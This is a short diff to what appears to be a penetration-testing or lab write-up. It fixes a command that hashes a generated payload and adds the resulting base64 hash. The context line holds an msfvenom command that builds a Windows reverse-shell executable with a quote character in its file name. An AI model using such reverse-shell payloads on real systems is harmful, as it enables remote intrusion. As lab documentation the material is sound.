@@ -232,8 +232,11 @@ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=7002 -f exe -o "Po77'.exe
 ```
 2. Calculate its hash 
 ```bash 
-shasum -a 512  | cut -d " " -f1 | xxd -r -p | base64
+shasum -a 512 "Po77'.exe" | cut -d " " -f1 | xxd -r -p | base64
 ```
+>0KAEZgATnqfm5G0YEkL1I28WvfX229sY9Imhd91kahyoKqBkxF7JTNR1tz6DzYtoGgn44zjn5lal PETNqZfZPg==
+
+
 ### Exploitation
 
 Step-by-step exploitation.
